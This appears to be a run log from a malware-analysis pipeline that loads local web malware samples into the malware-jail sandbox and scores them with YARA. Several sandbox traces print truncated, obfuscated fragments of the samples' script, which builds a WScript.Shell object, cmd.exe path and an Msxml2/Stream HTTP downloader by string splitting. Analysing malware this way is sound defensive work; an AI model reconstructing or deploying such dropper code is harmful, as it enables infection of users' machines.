+[18/05 18:42:46][info]Exporting results to: /results/localhost_18-42-0046.static.log
+[18/05 18:42:46][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0046_80C851D1/localhost_18-42-0046.js
+[18/05 18:42:46][info]Initializing YARA localhost_05-18_18-42-0046_80C851D1/results/ <all files>
+[18/05 18:42:46][info]Process at 30216 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0046_80C851D1/results]
+[18/05 18:42:46][info]80C851D1,/malware/localhost_05-18_18-42-0046_80C851D1/results/ <all files> ,40,Undetermined
+[18/05 18:42:46][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:46][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:46][info][5CAE0EF2]Injecting Transaction Monitor
+[18/05 18:42:46][info](5CAE0EF2)Starting job http://localhost/malware_samples/625345c67f92e6b627e40cbf4042e602.html
+[18/05 18:42:46][info](5CAE0EF2)Last page Navigated to http://localhost/malware_samples/625345c67f92e6b627e40cbf4042e602.html status: 200 OK date: Sat, 18 May 2019 15:42:46 GMT
+[18/05 18:42:46][info]Found frames: 0
+[18/05 18:42:46][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0046_5CAE0EF2/localhost_18-42-0046.js
+[18/05 18:42:46][info]Processing command for NodeJS in folder localhost_05-18_18-42-0046_5CAE0EF2 and file localhost_18-42-0046.js
+[18/05 18:42:46][info]Process at 30250 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0046_5CAE0EF2.json ./malware/localhost_05-18_18-42-0046_5CAE0EF2/localhost_18-42-0046.js]
+[18/05 18:42:47][info]Exporting results to: /results/localhost_18-42-0046.dynamic.log
+[18/05 18:42:47][info]Exporting results to: /results/localhost_18-42-0046.static.log
+[18/05 18:42:47][info]Dynamic URLs extracted from localhost_05-18_18-42-0046_5CAE0EF2/localhost_18-42-0046.js and saved to ./malware/localhost_05-18_18-42-0046_5CAE0EF2/output/urls.json
+[18/05 18:42:47][info]Initializing YARA localhost_05-18_18-42-0046_5CAE0EF2/results/ <all files>
+[18/05 18:42:47][info]Process at 30266 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0046_5CAE0EF2/results]
+[18/05 18:42:47][info]5CAE0EF2,/malware/localhost_05-18_18-42-0046_5CAE0EF2/results/ <all files> ,90,Malicious
+[18/05 18:42:47][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:47][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:47][info][48873702]Injecting Transaction Monitor
+[18/05 18:42:47][info](48873702)Starting job http://localhost/malware_samples/42acc190d620ea84cc15f81af66ae6b8.html
+[18/05 18:42:47][info](48873702)Last page Navigated to http://localhost/malware_samples/42acc190d620ea84cc15f81af66ae6b8.html status: 200 OK date: Sat, 18 May 2019 15:42:47 GMT
+[18/05 18:42:47][info]Found frames: 0
+[18/05 18:42:47][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0047_48873702/localhost_18-42-0047.js
+[18/05 18:42:47][info]Processing command for NodeJS in folder localhost_05-18_18-42-0047_48873702 and file localhost_18-42-0047.js
+[18/05 18:42:47][info]Process at 30300 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0047_48873702.json ./malware/localhost_05-18_18-42-0047_48873702/localhost_18-42-0047.js]
+[18/05 18:42:47][info]Exporting results to: /results/localhost_18-42-0047.dynamic.log
+[18/05 18:42:47][info]Exporting results to: /results/localhost_18-42-0047.static.log
+[18/05 18:42:47][info]Dynamic URLs extracted from localhost_05-18_18-42-0047_48873702/localhost_18-42-0047.js and saved to ./malware/localhost_05-18_18-42-0047_48873702/output/urls.json
+[18/05 18:42:47][info]Initializing YARA localhost_05-18_18-42-0047_48873702/results/ <all files>
+[18/05 18:42:47][info]Process at 30316 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0047_48873702/results]
+[18/05 18:42:47][info]48873702,/malware/localhost_05-18_18-42-0047_48873702/results/ <all files> ,40,Undetermined
+[18/05 18:42:47][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:47][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:47][info][078598A9]Injecting Transaction Monitor
+[18/05 18:42:47][info](078598A9)Starting job http://localhost/malware_samples/1cdf459e80ede868a24be642f61d0082.html
+[18/05 18:42:47][info](078598A9)Last page Navigated to http://localhost/malware_samples/1cdf459e80ede868a24be642f61d0082.html status: 200 OK date: Sat, 18 May 2019 15:42:47 GMT
+[18/05 18:42:47][info]Found frames: 0
+[18/05 18:42:47][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js
+[18/05 18:42:47][info]Processing command for NodeJS in folder localhost_05-18_18-42-0047_078598A9 and file localhost_18-42-0047.js
+[18/05 18:42:47][info]Process at 30350 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0047_078598A9.json ./malware/localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js]
+[18/05 18:42:48][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:48 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:48 - ------------------------
+18 May 18:42:48 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0047_078598A9.json ./malware/localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js
+18 May 18:42:48 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:48 - Malware files: ./malware/localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js
+18 May 18:42:48 - Execution timeout set to: 15 seconds
+18 May 18:42:48 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:48 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0047_078598A9/output/
+18 May 18:42:48 - Download from remote server: Return HTTP/404
+18 May 18:42:48 - ==> Preparing Sandbox environment.
+18 May 18:42:48 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:48 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:48 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:48 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:48 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:48 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:48 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:48 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:48 - ==> Executing malware file(s). =========================================
+18 May 18:42:48 -  => Executing: ./malware/localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js verbosely, reporting silent catches
+18 May 18:42:48 - Saving: malware-jail/../malware/localhost_05-18_18-42-0047_078598A9/output/._malware_localhost_05-18_18-42-0047_078598A9_localhost_18-42-0047.js
+18 May 18:42:48 - Saving: malware-jail/../malware/localhost_05-18_18-42-0047_078598A9/output/tr_._malware_localhost_05-18_18-42-0047_078598A9_localhost_18-42-0047.js
+18 May 18:42:48 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js'
+18 May 18:42:48 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js,xyz'
+18 May 18:42:48 - Calling eval[1]('function e(){?    var _hsiyudgfustdg = "WS"+""+"c"+"r"+"i"+"pt";?    var _c = "\%Sy"+"st"+""+"em"+"Root\%\\s"+"ystem32\\cmd."+"ex"+"e";?     var _87867t67t6gt = this[_hsiyudgfustdg]["Cre"+"ateOb"+"ject"](_hsiyudgfustdg+".She"+"ll"); ?    var _87g6sd5 ... (truncated)')
+18 May 18:42:48 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:48 - new WScript.Shell[14]
+18 May 18:42:48 - new WshEnvironment[15](SYSTEM)
+18 May 18:42:48 - WScript.Shell[14].Environment(SYSTEM)
+18 May 18:42:48 - WshEnvironment[15](SYSTEM)(COMSPEC) => C:\WINDOWS\system32\cmd.exe
+18 May 18:42:48 - Exception occured: object undefined:8
+	else {this[this["_hsiyudgfustdg"]]["Qui"+""+"t"](1);};
+	                                  ^
+
+TypeError: Cannot read property 'Quit' of undefined
+    at e (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:8:36)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:10:1)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js:16:1
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+18 May 18:42:48 - ==> Cleaning up sandbox.
+18 May 18:42:48 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:48 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:48 - Saving: malware-jail/../malware/localhost_05-18_18-42-0047_078598A9/output/eval_1.js
+
+[18/05 18:42:48][info]Exporting results to: /results/localhost_18-42-0047.dynamic.log
+[18/05 18:42:48][info]Exporting results to: /results/localhost_18-42-0047.static.log
+[18/05 18:42:48][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0047_078598A9/localhost_18-42-0047.js
+[18/05 18:42:48][info]Initializing YARA localhost_05-18_18-42-0047_078598A9/results/ <all files>
+[18/05 18:42:48][info]Process at 30366 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0047_078598A9/results]
+[18/05 18:42:48][info]078598A9,/malware/localhost_05-18_18-42-0047_078598A9/results/ <all files> ,60,Suspicious
+[18/05 18:42:48][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:48][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:48][info][5FBA2A3F]Injecting Transaction Monitor
+[18/05 18:42:48][info](5FBA2A3F)Starting job http://localhost/malware_samples/a3df11bcf264abae8f8c85f294c9e31f.html
+[18/05 18:42:48][info](5FBA2A3F)Last page Navigated to http://localhost/malware_samples/a3df11bcf264abae8f8c85f294c9e31f.html status: 200 OK date: Sat, 18 May 2019 15:42:48 GMT
+[18/05 18:42:48][info]Found frames: 0
+[18/05 18:42:48][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0048_5FBA2A3F/localhost_18-42-0048.js
+[18/05 18:42:48][info]Processing command for NodeJS in folder localhost_05-18_18-42-0048_5FBA2A3F and file localhost_18-42-0048.js
+[18/05 18:42:48][info]Process at 30400 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0048_5FBA2A3F.json ./malware/localhost_05-18_18-42-0048_5FBA2A3F/localhost_18-42-0048.js]
+[18/05 18:42:49][info]Exporting results to: /results/localhost_18-42-0048.dynamic.log
+[18/05 18:42:49][info]Exporting results to: /results/localhost_18-42-0048.static.log
+[18/05 18:42:49][info]Dynamic URLs extracted from localhost_05-18_18-42-0048_5FBA2A3F/localhost_18-42-0048.js and saved to ./malware/localhost_05-18_18-42-0048_5FBA2A3F/output/urls.json
+[18/05 18:42:49][info]Initializing YARA localhost_05-18_18-42-0048_5FBA2A3F/results/ <all files>
+[18/05 18:42:49][info]Process at 30416 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0048_5FBA2A3F/results]
+[18/05 18:42:49][info]5FBA2A3F,/malware/localhost_05-18_18-42-0048_5FBA2A3F/results/ <all files> ,120,Malicious
+[18/05 18:42:49][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:49][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:49][info][AB74563F]Injecting Transaction Monitor
+[18/05 18:42:49][info](AB74563F)Starting job http://localhost/malware_samples/1216016855edb7590468aaefca4adf9e.html
+[18/05 18:42:49][info](AB74563F)Last page Navigated to http://localhost/malware_samples/1216016855edb7590468aaefca4adf9e.html status: 200 OK date: Sat, 18 May 2019 15:42:49 GMT
+[18/05 18:42:49][info]Found frames: 0
+[18/05 18:42:49][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0049_AB74563F/localhost_18-42-0049.js
+[18/05 18:42:49][info]Processing command for NodeJS in folder localhost_05-18_18-42-0049_AB74563F and file localhost_18-42-0049.js
+[18/05 18:42:49][info]Process at 30450 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0049_AB74563F.json ./malware/localhost_05-18_18-42-0049_AB74563F/localhost_18-42-0049.js]
+[18/05 18:42:49][info]Exporting results to: /results/localhost_18-42-0049.dynamic.log
+[18/05 18:42:49][info]Exporting results to: /results/localhost_18-42-0049.static.log
+[18/05 18:42:49][info]Dynamic URLs extracted from localhost_05-18_18-42-0049_AB74563F/localhost_18-42-0049.js and saved to ./malware/localhost_05-18_18-42-0049_AB74563F/output/urls.json
+[18/05 18:42:49][info]Initializing YARA localhost_05-18_18-42-0049_AB74563F/results/ <all files>
+[18/05 18:42:49][info]Process at 30466 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0049_AB74563F/results]
+[18/05 18:42:49][info]AB74563F,/malware/localhost_05-18_18-42-0049_AB74563F/results/ <all files> ,130,Malicious
+[18/05 18:42:49][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:49][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:49][info][047DB1DA]Injecting Transaction Monitor
+[18/05 18:42:49][info](047DB1DA)Starting job http://localhost/malware_samples/a31336f192353e1997fed06b582e1aef.html
+[18/05 18:42:49][info](047DB1DA)Last page Navigated to http://localhost/malware_samples/a31336f192353e1997fed06b582e1aef.html status: 200 OK date: Sat, 18 May 2019 15:42:49 GMT
+[18/05 18:42:49][info]Found frames: 0
+[18/05 18:42:49][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js
+[18/05 18:42:49][info]Processing command for NodeJS in folder localhost_05-18_18-42-0049_047DB1DA and file localhost_18-42-0049.js
+[18/05 18:42:49][info]Process at 30500 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0049_047DB1DA.json ./malware/localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js]
+[18/05 18:42:50][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:50 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:50 - ------------------------
+18 May 18:42:50 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0049_047DB1DA.json ./malware/localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js
+18 May 18:42:50 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:50 - Malware files: ./malware/localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js
+18 May 18:42:50 - Execution timeout set to: 15 seconds
+18 May 18:42:50 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:50 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0049_047DB1DA/output/
+18 May 18:42:50 - Download from remote server: Return HTTP/404
+18 May 18:42:50 - ==> Preparing Sandbox environment.
+18 May 18:42:50 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:50 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:50 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:50 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:50 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:50 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:50 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:50 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:50 - ==> Executing malware file(s). =========================================
+18 May 18:42:50 -  => Executing: ./malware/localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js verbosely, reporting silent catches
+18 May 18:42:50 - Saving: malware-jail/../malware/localhost_05-18_18-42-0049_047DB1DA/output/._malware_localhost_05-18_18-42-0049_047DB1DA_localhost_18-42-0049.js
+18 May 18:42:50 - Saving: malware-jail/../malware/localhost_05-18_18-42-0049_047DB1DA/output/tr_._malware_localhost_05-18_18-42-0049_047DB1DA_localhost_18-42-0049.js
+18 May 18:42:50 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js'
+18 May 18:42:50 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js,xyz'
+18 May 18:42:50 - Calling eval[1]('function e(){?    var _hsiyudgfustdg = "WS"+""+"c"+"r"+"i"+"pt";?    var _c = "\%Sy"+"st"+""+"em"+"Root\%\\s"+"ystem32\\cmd."+"ex"+"e";?     var _87867t67t6gt = this[_hsiyudgfustdg]["Cre"+"ateOb"+"ject"](_hsiyudgfustdg+".She"+"ll"); ?    var _87g6sd5 ... (truncated)')
+18 May 18:42:50 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:50 - new WScript.Shell[14]
+18 May 18:42:50 - new WshEnvironment[15](SYSTEM)
+18 May 18:42:50 - WScript.Shell[14].Environment(SYSTEM)
+18 May 18:42:50 - WshEnvironment[15](SYSTEM)(COMSPEC) => C:\WINDOWS\system32\cmd.exe
+18 May 18:42:50 - Exception occured: object undefined:8
+	else {this[this["_hsiyudgfustdg"]]["Qui"+""+"t"](1);};
+	                                  ^
+
+TypeError: Cannot read property 'Quit' of undefined
+    at e (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:8:36)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:10:1)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js:17:1
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+18 May 18:42:50 - ==> Cleaning up sandbox.
+18 May 18:42:50 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:50 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:50 - Saving: malware-jail/../malware/localhost_05-18_18-42-0049_047DB1DA/output/eval_1.js
+
+[18/05 18:42:50][info]Exporting results to: /results/localhost_18-42-0049.dynamic.log
+[18/05 18:42:50][info]Exporting results to: /results/localhost_18-42-0049.static.log
+[18/05 18:42:50][info]No Dynamic URLs extracted from: localhost_05-18_18-42-0049_047DB1DA/localhost_18-42-0049.js
+[18/05 18:42:50][info]Initializing YARA localhost_05-18_18-42-0049_047DB1DA/results/ <all files>
+[18/05 18:42:50][info]Process at 30516 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0049_047DB1DA/results]
+[18/05 18:42:50][info]047DB1DA,/malware/localhost_05-18_18-42-0049_047DB1DA/results/ <all files> ,60,Suspicious
+[18/05 18:42:50][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:50][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:50][info][1D0BDA91]Injecting Transaction Monitor
+[18/05 18:42:50][info](1D0BDA91)Starting job http://localhost/malware_samples/218626ee5eb692d2becd811a89eaa1a8.html
+[18/05 18:42:50][info](1D0BDA91)Last page Navigated to http://localhost/malware_samples/218626ee5eb692d2becd811a89eaa1a8.html status: 200 OK date: Sat, 18 May 2019 15:42:50 GMT
+[18/05 18:42:50][info]Found frames: 0
+[18/05 18:42:50][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0050_1D0BDA91/localhost_18-42-0050.js
+[18/05 18:42:50][info]Processing command for NodeJS in folder localhost_05-18_18-42-0050_1D0BDA91 and file localhost_18-42-0050.js
+[18/05 18:42:50][info]Process at 30550 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0050_1D0BDA91.json ./malware/localhost_05-18_18-42-0050_1D0BDA91/localhost_18-42-0050.js]
+[18/05 18:42:51][info]Exporting results to: /results/localhost_18-42-0050.dynamic.log
+[18/05 18:42:51][info]Exporting results to: /results/localhost_18-42-0050.static.log
+[18/05 18:42:51][info]Dynamic URLs extracted from localhost_05-18_18-42-0050_1D0BDA91/localhost_18-42-0050.js and saved to ./malware/localhost_05-18_18-42-0050_1D0BDA91/output/urls.json
+[18/05 18:42:51][info]Initializing YARA localhost_05-18_18-42-0050_1D0BDA91/results/ <all files>
+[18/05 18:42:51][info]Process at 30567 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0050_1D0BDA91/results]
+[18/05 18:42:51][info]1D0BDA91,/malware/localhost_05-18_18-42-0050_1D0BDA91/results/ <all files> ,160,Malicious
+[18/05 18:42:51][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:51][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:51][info][4EB8AAAA]Injecting Transaction Monitor
+[18/05 18:42:51][info](4EB8AAAA)Starting job http://localhost/malware_samples/0253ab96363bf308286d04fea107c64c.html
+[18/05 18:42:51][info](4EB8AAAA)Last page Navigated to http://localhost/malware_samples/0253ab96363bf308286d04fea107c64c.html status: 200 OK date: Sat, 18 May 2019 15:42:51 GMT
+[18/05 18:42:51][info]Found frames: 0
+[18/05 18:42:51][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0051_4EB8AAAA/localhost_18-42-0051.js
+[18/05 18:42:51][info]Processing command for NodeJS in folder localhost_05-18_18-42-0051_4EB8AAAA and file localhost_18-42-0051.js
+[18/05 18:42:51][info]Process at 30601 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0051_4EB8AAAA.json ./malware/localhost_05-18_18-42-0051_4EB8AAAA/localhost_18-42-0051.js]
+[18/05 18:42:51][info]Exporting results to: /results/localhost_18-42-0051.dynamic.log
+[18/05 18:42:51][info]Exporting results to: /results/localhost_18-42-0051.static.log
+[18/05 18:42:51][info]Dynamic URLs extracted from localhost_05-18_18-42-0051_4EB8AAAA/localhost_18-42-0051.js and saved to ./malware/localhost_05-18_18-42-0051_4EB8AAAA/output/urls.json
+[18/05 18:42:51][info]Initializing YARA localhost_05-18_18-42-0051_4EB8AAAA/results/ <all files>
+[18/05 18:42:51][info]Process at 30617 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0051_4EB8AAAA/results]
+[18/05 18:42:51][info]4EB8AAAA,/malware/localhost_05-18_18-42-0051_4EB8AAAA/results/ <all files> ,80,Malicious
+[18/05 18:42:51][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:51][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:51][info][6CF36380]Injecting Transaction Monitor
+[18/05 18:42:51][info](6CF36380)Starting job http://localhost/malware_samples/d0cf97f5d86ad839434134c3b735b1a3.html
+[18/05 18:42:51][info](6CF36380)Last page Navigated to http://localhost/malware_samples/d0cf97f5d86ad839434134c3b735b1a3.html status: 200 OK date: Sat, 18 May 2019 15:42:51 GMT
+[18/05 18:42:51][info]Found frames: 0
+[18/05 18:42:51][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js
+[18/05 18:42:51][info]Processing command for NodeJS in folder localhost_05-18_18-42-0051_6CF36380 and file localhost_18-42-0051.js
+[18/05 18:42:51][info]Process at 30651 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0051_6CF36380.json ./malware/localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js]
+[18/05 18:42:52][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:52 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:52 - ------------------------
+18 May 18:42:52 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0051_6CF36380.json ./malware/localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js
+18 May 18:42:52 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:52 - Malware files: ./malware/localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js
+18 May 18:42:52 - Execution timeout set to: 15 seconds
+18 May 18:42:52 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:52 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0051_6CF36380/output/
+18 May 18:42:52 - Download from remote server: Return HTTP/404
+18 May 18:42:52 - ==> Preparing Sandbox environment.
+18 May 18:42:52 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:52 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:52 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:52 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:52 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:52 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:52 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:52 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:52 - ==> Executing malware file(s). =========================================
+18 May 18:42:52 -  => Executing: ./malware/localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js verbosely, reporting silent catches
+18 May 18:42:52 - Saving: malware-jail/../malware/localhost_05-18_18-42-0051_6CF36380/output/._malware_localhost_05-18_18-42-0051_6CF36380_localhost_18-42-0051.js
+18 May 18:42:52 - Saving: malware-jail/../malware/localhost_05-18_18-42-0051_6CF36380/output/tr_._malware_localhost_05-18_18-42-0051_6CF36380_localhost_18-42-0051.js
+18 May 18:42:52 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js'
+18 May 18:42:52 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0051_6CF36380/localhost_18-42-0051.js,xyz'
+18 May 18:42:52 - Calling unescape() no.: 1
+18 May 18:42:52 - Calling eval[1]('var text = ("ipt");var sortDetached = ("ep"), initial = ("Msxml"), map = ("Stre");p = (18); idx = (952); setMatched = ("rea"); rchecked = (19877681);preMap = ("http:/"), isArrayLike = ("HTT");globalEval = ("pt"), errorCallback = (50);var amd = ("2.Se ... (truncated)')
+18 May 18:42:52 - Exception occured: object undefined:1
